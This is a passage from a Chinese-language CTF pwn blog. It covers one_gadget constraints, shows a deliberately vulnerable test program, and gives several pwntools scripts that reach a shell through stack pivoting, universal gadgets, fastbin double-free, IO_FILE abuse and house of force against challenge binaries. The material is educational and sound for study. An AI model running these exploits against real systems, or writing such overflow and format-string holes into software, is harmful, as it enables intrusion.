<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">:</span><br><span class="line">[*] Process &#x27;./story&#x27; stopped with exit code 127 (pid 17986)</span><br><span class="line">1�I��^H\x89�H���PTI���</span><br><span class="line">                      @: 0: Can&#x27;t open </span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line">$ </span><br><span class="line">[*] Got EOF while sending in interactive</span><br></pre></td></tr></table></figure>

<p>这时候就要想一下我们还能控制什么,事实上这题很巧,能利用的缓冲区很大</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ( v1 &gt; 128 )</span><br><span class="line">  v1 = 1024LL;</span><br></pre></td></tr></table></figure>

<p>所以可以搞点骚操作,比如可以直接向最后的 buf 多加点东西,如填入 <code>payload = 0x88*&#39;\x00&#39;+p64(canary)+p64(0)+p64(one)+p64(0)*100</code> ,加了<code>p64(0)*100</code>,毕竟不用白不用不是.</p>
<p>这绝对满足上述的栈限制的所有条件,基本上是一种栈条件通杀的方式.当然这种方式很局限,比如说控制不到栈,或者限制条件是寄存器,这时候就要看下边的技巧了</p>
<h2 id="利用-leave"><a href="#利用-leave" class="headerlink" title="利用 leave"></a>利用 leave</h2><blockquote>
<p>结合 bss 端精准打击</p>
</blockquote>
<p>我们自己写一段程序进行测试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">char x[500]=&#123;0&#125;;</span><br><span class="line">int main(int argc, char** argv) &#123;</span><br><span class="line">	char buf[128];</span><br><span class="line">	char a[100];</span><br><span class="line">	scanf(&quot;%s&quot;,a);</span><br><span class="line">	printf(a);</span><br><span class="line">	printf(&quot;done\n&quot;);</span><br><span class="line">	read(0, buf, 256);</span><br><span class="line">	printf(&quot;ok\n&quot;);</span><br><span class="line">	read(0, x, 20);</span><br><span class="line">	write(1, &quot;Hello, World\n&quot;, 13);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个是比较符合我的想法的,当然可以用上边的方法,因为这个程序把 read 的字节设置的很大(这样便于一个程序贯穿全篇,不用反复修改).用 gcc 编译(<code>gcc -fno-stack-protector -o test test.c</code>),我在这里把 canary 关了,大家可以自行取舍.一个格式化字符串用于泄漏,一个溢出用于控制程序流程.但是这个在本机打的话 one_gadget 不经过修改也能用, exp1 如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p= process(&#x27;./test&#x27;)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">p.sendline(&quot;%39$p&quot;)</span><br><span class="line">p.recvuntil(&quot;0x&quot;)</span><br><span class="line"></span><br><span class="line">addr = int(p.recvuntil(&quot;done\n&quot;)[:-5],16)</span><br><span class="line">libc_base = addr - libc.symbols[&#x27;__libc_start_main&#x27;]-0xf0</span><br><span class="line">info(&quot;libc:0x%x&quot;,libc_base)</span><br><span class="line">one = libc_base+0xf1147</span><br><span class="line">pay = 136*&#x27;\x00&#x27;+p64(one)</span><br><span class="line">p.send(pay)</span><br><span class="line">p.recvuntil(&#x27;ok\n&#x27;)</span><br><span class="line">p.sendline(&#x27;123&#x27;)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>其中<code>__libc_start_main+240</code>偏移是 39 .但我觉得还是不够优雅,能不能不抱侥幸心理,必定成功?? exp2 如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p= process(&#x27;./test&#x27;)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">p.sendline(&quot;%39$p&quot;)</span><br><span class="line">p.recvuntil(&quot;0x&quot;)</span><br><span class="line"></span><br><span class="line">addr = int(p.recvuntil(&quot;done\n&quot;)[:-5],16)</span><br><span class="line">libc_base = addr - libc.symbols[&#x27;__libc_start_main&#x27;]-0xf0</span><br><span class="line">info(&quot;libc:0x%x&quot;,libc_base)</span><br><span class="line">one = libc_base+0xf1147</span><br><span class="line"></span><br><span class="line">pay = (136-8)*&#x27;\x00&#x27;+p64(0x601080)+p64(0x400702)</span><br><span class="line"></span><br><span class="line">p.send(pay)</span><br><span class="line">p.recvuntil(&#x27;ok\n&#x27;)</span><br><span class="line">payload = p64(one)*2</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>可以看到我在 pay 构造上把之前一直被我们忽视的 ebp 改成了 bss 端,然后的<code>p64(0x400702)</code>是 leave 地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400702                 leave</span><br><span class="line">.text:0000000000400703                 retn</span><br></pre></td></tr></table></figure>

<p>大家应该了然了,这就是一个常规的栈迁移,迁移到 bss 后我们有 20 个字节可控,已经够了,很暴力填入两个 one_gadget 就完事</p>
<p>当然大家应该都知道,这个的关键就在于程序到底开没开 PIE 了,没开一切好说,开了就只能泄漏(泄漏 bss 地址可还行,我没见过),没有泄漏就得另某出路了</p>
<h2 id="rax-null"><a href="#rax-null" class="headerlink" title="rax &#x3D;&#x3D; null"></a>rax &#x3D;&#x3D; null</h2><p>回到一开始的问题,我们的限制条件只有两种,一个是 rax 一个就是栈,那控制 rax 能好用吗??事实上直接去控制 rax 的值是很难做到的,在看了很多程序的汇编后我发现真正用 rax 的虽然很多很多,但都用不了,不是离 ret 太远就是只能控制 eax 写为 0 ,难以做到两全其美.这时候我们换个思路,根据返回值下手,就比如之前说的自己写的这个程序,在</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br></pre></td></tr></table></figure>

<p>就是好用的, exp3 如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p= process(&#x27;./test&#x27;)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">p.sendline(&quot;%39$p&quot;)</span><br><span class="line">p.recvuntil(&quot;0x&quot;)</span><br><span class="line"></span><br><span class="line">addr = int(p.recvuntil(&quot;done\n&quot;)[:-5],16)</span><br><span class="line">libc_base = addr - libc.symbols[&#x27;__libc_start_main&#x27;]-0xf0</span><br><span class="line">info(&quot;libc:0x%x&quot;,libc_base)</span><br><span class="line">one = libc_base+0x45216</span><br><span class="line">pay = 136*&#x27;\x00&#x27;+p64(one)</span><br><span class="line">p.send(pay)</span><br><span class="line">p.recvuntil(&#x27;ok\n&#x27;)</span><br><span class="line">p.sendline(&#x27;123&#x27;)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>原因就是 write 返回值可控,之后程序很舒服的做了一个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004006F8                 call    _write</span><br><span class="line">.text:00000000004006FD                 mov     eax, 0</span><br><span class="line">.text:0000000000400702                 leave</span><br><span class="line">.text:0000000000400703                 retn</span><br></pre></td></tr></table></figure>

<p>操作,让我们获得了 shell ,但是其他的程序就不是如此了.例如之前所说的 story ,这个程序关于 rax 最后的调用关系如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400A21                 lea     rax, [rbp+s]</span><br></pre></td></tr></table></figure>

<p>把 <code>rbp+s</code> 给了 rax ,之后就没有对其的修改了,这 one_gadget 能用就太假了.</p>
<p>事实上别的 libc 版本还有别的寄存器限制,如 rcx 等等.所以只能想一些方法争取主动的变换寄存器的值,确实难度很大.</p>
<h2 id="万能-gadget"><a href="#万能-gadget" class="headerlink" title="万能 gadget"></a>万能 gadget</h2><blockquote>
<p>最强武器</p>
</blockquote>
<p>既然控制寄存器很恶心那就把重点放在栈上.</p>
<p>不是还有一个万能 gadget 吗,尝试进行 pop 行不行(应该是最舒服的思路)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400766                 add     rsp, 8</span><br><span class="line">.text:000000000040076A                 pop     rbx</span><br><span class="line">.text:000000000040076B                 pop     rbp</span><br><span class="line">.text:000000000040076C                 pop     r12</span><br><span class="line">.text:000000000040076E                 pop     r13</span><br><span class="line">.text:0000000000400770                 pop     r14</span><br><span class="line">.text:0000000000400772                 pop     r15</span><br><span class="line">.text:0000000000400774                 retn</span><br></pre></td></tr></table></figure>
<p>exp4 如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p= process(&#x27;./test&#x27;)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">p.sendline(&quot;%39$p&quot;)</span><br><span class="line">p.recvuntil(&quot;0x&quot;)</span><br><span class="line"></span><br><span class="line">addr = int(p.recvuntil(&quot;done\n&quot;)[:-5],16)</span><br><span class="line">libc_base = addr - libc.symbols[&#x27;__libc_start_main&#x27;]-0xf0</span><br><span class="line">info(&quot;libc:0x%x&quot;,libc_base)</span><br><span class="line">one = libc_base+0xf02a4</span><br><span class="line">pay = 136*&#x27;\x00&#x27;+p64(0x400766)+p64(0)*7+p64(one)</span><br><span class="line">p.send(pay)</span><br><span class="line">p.recvuntil(&#x27;ok\n&#x27;)</span><br><span class="line">p.sendline(&#x27;123&#x27;)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>可以看到,调整起来很灵活,不用必须 pop 7 个,溢出字节数目可观的话基本都能实现 getshell ,毕竟<code>p64(0)*7</code>确实很占宝贵的字节数目,导致这个版本 libc 还没有第一种效率高,一种走弯路的感觉</p>
<p>至少我能想到的思路就这些,欢迎大家讨论交流</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这篇主要是栈的研究,而堆也有一些很骚的思路,比如说:改 malloc_hook 为 one_gadget 不好用是常有的事,这时候可以利用 realloc_hook 去微微(因为 pop push 数量受限)调整栈情况,具体可参阅<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-246786.htm">师傅帖子</a>, tql </p>
<p>等等</p>
<p>这篇文章旨在开拓大家的思路,不被条件限制住.毕竟真的不能用 one_gadget 的时候不还有 rop 保底的吗,2333</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/10/20/2019-10-20-one_gadget/" data-id="cuid4luRxeRaFR_KGdeoXsFOw" data-title="One_gadget" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2019-10-11-1st_week" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/10/11/2019-10-11-1st_week/" class="article-date">
  <time class="dt-published" datetime="2019-10-10T16:00:00.000Z" itemprop="datePublished">2019-10-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/10/11/2019-10-11-1st_week/">first week</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <blockquote>
<p>10.8 ~ 10.13</p>
</blockquote>
<p>This four exercises contain Triathlon Finals last year and one exercise in CISCN</p>
<h2 id="littlenote"><a href="#littlenote" class="headerlink" title="littlenote"></a>littlenote</h2><blockquote>
<p>UAF</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process(&#x27;./littlenote&#x27;)</span><br><span class="line">def add(content):</span><br><span class="line">    io.sendline(&#x27;1&#x27;)</span><br><span class="line">    io.sendafter(&#x27;e\n&#x27;,content)</span><br><span class="line">    io.sendlineafter(&#x27;?\n&#x27;,&#x27;Y&#x27;)</span><br><span class="line">    io.recvuntil(&#x27;e\n&#x27;)</span><br><span class="line">def show(index):</span><br><span class="line">    io.sendline(&#x27;2&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;?\n&#x27;,str(index))</span><br><span class="line">    return (io.recvuntil(&quot;\n&quot;))[:-1]</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    io.sendline(&#x27;3&#x27;)</span><br><span class="line">    io.recvuntil(&#x27;?\n&#x27;)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line">    io.recvuntil(&#x27;Done\n&#x27;)</span><br><span class="line"></span><br><span class="line">add(&#x27;\x00&#x27;*0x58+p64(0x71))</span><br><span class="line">add(&#x27;1&#x27;)</span><br><span class="line">add(p64(0x0)*5+p64(0x41))#bypass</span><br><span class="line">free(1)</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">heap_base=u64((show(0)).ljust(8,&#x27;\x00&#x27;))-0x70</span><br><span class="line">print &quot;heap_base -&gt; &quot; + hex(heap_base)</span><br><span class="line">add(p64(heap_base+0x60))</span><br><span class="line">add(&#x27;1&#x27;)</span><br><span class="line">add(&#x27;1&#x27;)</span><br><span class="line">add(&#x27;\x00&#x27;*8+p64(0xA1))</span><br><span class="line">free(1)</span><br><span class="line">libc_base=u64((show(1)).ljust(8,&#x27;\x00&#x27;))-0x3C4B78</span><br><span class="line">print &quot;libc_base -&gt; &quot; + hex(libc_base)</span><br><span class="line">one_gadget=libc_base+0xf02a4</span><br><span class="line">print &quot;one_gadget -&gt; &quot; + hex(one_gadget)</span><br><span class="line">add(&#x27;7&#x27;) # 7</span><br><span class="line">add(&#x27;8&#x27;) # 8</span><br><span class="line">add(&#x27;9&#x27;) # 9</span><br><span class="line">free(7)</span><br><span class="line">free(8)</span><br><span class="line">free(7)</span><br><span class="line">point=libc_base+0x3c4af5-8</span><br><span class="line">print &quot;point -&gt; &quot; +hex(point) </span><br><span class="line">add(p64(point)) # 10</span><br><span class="line">add(&#x27;b&#x27;) # 11</span><br><span class="line">add(&#x27;c&#x27;) # 12</span><br><span class="line">add(&#x27;a&#x27;*19+p64(one_gadget))</span><br><span class="line">io.sendline(&#x27;1&#x27;)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Seven-step homicide</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">free(1)</span><br><span class="line">free(2)</span><br><span class="line">feee(1)</span><br><span class="line">malloc(3)</span><br><span class="line">malloc(?)</span><br><span class="line">malloc(?)</span><br><span class="line">malloc(*****)</span><br></pre></td></tr></table></figure>

<p><code>3</code> became <code>*****</code></p>
<p>Because this exercise can only malloc(0x71) ,so we should use fastbin attack to modify the size to put the chunk we malloced into the unsortedbin to leak the libc.address</p>
<h2 id="bookstore"><a href="#bookstore" class="headerlink" title="bookstore"></a>bookstore</h2><blockquote>
<p>Vulnerabilities in Self-Writing Functions</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">env=os.environ</span><br><span class="line">env[&#x27;LD_PRELOAD&#x27;]=&#x27;./libc_64.so&#x27;</span><br><span class="line">#context.log_level=&#x27;debug&#x27;</span><br><span class="line">r=process(&#x27;./bookstore&#x27;)</span><br><span class="line">def add(author,size,cont):</span><br><span class="line">    r.recvuntil(&#x27;Your choice:&#x27;)</span><br><span class="line">    r.sendline(&#x27;1&#x27;)</span><br><span class="line">    r.recvuntil(&#x27;What is the author name?&#x27;)</span><br><span class="line">    r.sendline(author)</span><br><span class="line">    r.recvuntil(&#x27;How long is the book name?&#x27;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&#x27;What is the name of the book?&#x27;)</span><br><span class="line">    r.sendline(cont)</span><br><span class="line">def delete(idx):</span><br><span class="line">    r.recvuntil(&#x27;Your choice:&#x27;)</span><br><span class="line">    r.sendline(&#x27;2&#x27;)</span><br><span class="line">    r.recvuntil(&#x27;?&#x27;)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">def show(idx):</span><br><span class="line">    r.recvuntil(&#x27;Your choice:&#x27;)</span><br><span class="line">    r.sendline(&#x27;3&#x27;)</span><br><span class="line">    r.recvuntil(&#x27;?&#x27;)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">add(&#x27;a&#x27;*0x10,0,&#x27;0&#x27;*0x10)#0</span><br><span class="line"></span><br><span class="line">add(&#x27;b&#x27;*0x10,0x40,&#x27;1&#x27;*0x10)#1</span><br><span class="line">add(&#x27;c&#x27;*0x10,0x40,&#x27;2&#x27;*0x10)#2</span><br><span class="line">add(&#x27;d&#x27;*0x10,0x40,&#x27;3&#x27;*0x10)#3</span><br><span class="line">delete(0)</span><br><span class="line">add(&#x27;a&#x27;*0x10,0,&#x27;0&#x27;*0x18+p64(0xa1))#0</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">add(&#x27;b&#x27;,0,&#x27;1&#x27;*1)#1</span><br><span class="line">show(1)</span><br><span class="line">r.recvuntil(&#x27;\x65\x3a&#x27;)</span><br><span class="line">lleak=u64(r.recv(6).ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">print &quot;lleak:&quot;+hex(lleak)</span><br><span class="line">lbase=lleak-0x3c4c31</span><br><span class="line">sys=lbase+0x45390</span><br><span class="line">sh=lbase+0x18cd17</span><br><span class="line">#0x18cd57</span><br><span class="line"></span><br><span class="line">iolistall=lbase+0x3c5520</span><br><span class="line">strjumps=lbase+0x3c37a0</span><br><span class="line">print &quot;iolistall:&quot;+hex(iolistall)</span><br><span class="line">fire=p64(0)+p64(0x61)+p64(0)+p64(iolistall-0x10)+p64(0)+p64(1)+p64(0)+p64(sh)+p64(0)*19+p64(strjumps-8)</span><br><span class="line">fire=fire.ljust(0xe8,&#x27;\x00&#x27;)+p64(sys)</span><br><span class="line">add(&#x27;e&#x27;,0,&#x27;\x00&#x27;*0x10+fire)#4</span><br><span class="line">r.recvuntil(&#x27;Your choice:&#x27;)</span><br><span class="line">r.sendline(&#x27;1&#x27;)</span><br><span class="line">r.recvuntil(&#x27;What is the author name?&#x27;)</span><br><span class="line">r.sendline(&#x27;test&#x27;)</span><br><span class="line">r.recvuntil(&#x27;How long is the book name?&#x27;)</span><br><span class="line">r.sendline(str(0x40))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>used <code>IO_FILE&#39;s strjumps</code> ,but it’s not about modifying vtable</p>
<h2 id="myhouse"><a href="#myhouse" class="headerlink" title="myhouse"></a>myhouse</h2><blockquote>
<p>Write any address to <code>\x00</code></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">env=os.environ</span><br><span class="line">#env[&#x27;LD_PRELOAD&#x27;]=&#x27;./myhouse.so&#x27;</span><br><span class="line">#context.log_level=&#x27;debug&#x27;</span><br><span class="line">libc=ELF(&#x27;./myhouse.so&#x27;)</span><br><span class="line">r=process(&#x27;./myhouse&#x27;)</span><br><span class="line">def addroom(size):</span><br><span class="line">    r.recvuntil(&#x27;Your choice:\n&#x27;)</span><br><span class="line">    r.sendline(&#x27;1&#x27;)</span><br><span class="line">    r.recvuntil(&#x27;What is the size of your room?&#x27;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">def editroom(cont):</span><br><span class="line">    r.recvuntil(&#x27;Your choice:&#x27;)</span><br><span class="line">    r.sendline(&#x27;2&#x27;)</span><br><span class="line">    r.recvuntil(&#x27;shining!&#x27;)</span><br><span class="line">    r.send(cont)</span><br><span class="line">def show():</span><br><span class="line">    r.recvuntil(&#x27;Your choice:&#x27;)</span><br><span class="line">    r.sendline(&#x27;3&#x27;)</span><br><span class="line">#step 1:write &#x27;\x00&#x27; to main_arena&#x27;s top_chunk pointer and set top&#x27;s size</span><br><span class="line">r.recvuntil(&#x27;name?&#x27;)</span><br><span class="line">r.send(&#x27;a&#x27;*0x20)</span><br><span class="line">r.recvuntil(&#x27;name of your house?&#x27;)</span><br><span class="line">r.send(&#x27;b&#x27;*0xf8+p64(0xffffffffffffffff))</span><br><span class="line">#gdb.attach(r)</span><br><span class="line">r.recvuntil(&#x27;size of your house?&#x27;)</span><br><span class="line">r.sendline(str(0x5c5b69))</span><br><span class="line"></span><br><span class="line">r.recvuntil(&#x27;Too large!&#x27;)</span><br><span class="line">r.sendline(str(0x200000))</span><br><span class="line">r.recvuntil(&#x27;Give me its description:&#x27;)</span><br><span class="line">r.send(&#x27;c&#x27;*0x30)</span><br><span class="line">#step 2:leak heap address</span><br><span class="line">show()</span><br><span class="line">r.recvuntil(&#x27;a&#x27;*0x20)</span><br><span class="line">heap=u64(r.recvline()[:-1].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">print &quot;heap:&quot;+hex(heap)</span><br><span class="line"></span><br><span class="line">#step 3:house of force</span><br><span class="line">bssp=0x6020c0</span><br><span class="line">addroom(bssp-(heap+0xf0)-0x20)</span><br><span class="line">addroom(0x10)</span><br><span class="line">gdb.attach(r)</span><br><span class="line">#step 4:leak GOT and change GOT</span><br><span class="line">got_atoi=0x602058</span><br><span class="line">editroom(p64(got_atoi)+p64(got_atoi))</span><br><span class="line">#gdb.attach(r)</span><br><span class="line">show()</span><br><span class="line">r.recvuntil(&#x27;And description:\n&#x27;)</span><br><span class="line">atoi=u64(r.recvline()[:-1].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">print &quot;atoi:&quot;+hex(atoi)</span><br><span class="line">sys=atoi-libc.symbols[&#x27;atoi&#x27;]+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">editroom(p64(sys))</span><br><span class="line">r.sendline(&#x27;sh&#x27;)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="daily"><a href="#daily" class="headerlink" title="daily"></a>daily</h2><blockquote>
<p>“Any address” <code>free</code></p>
</blockquote>
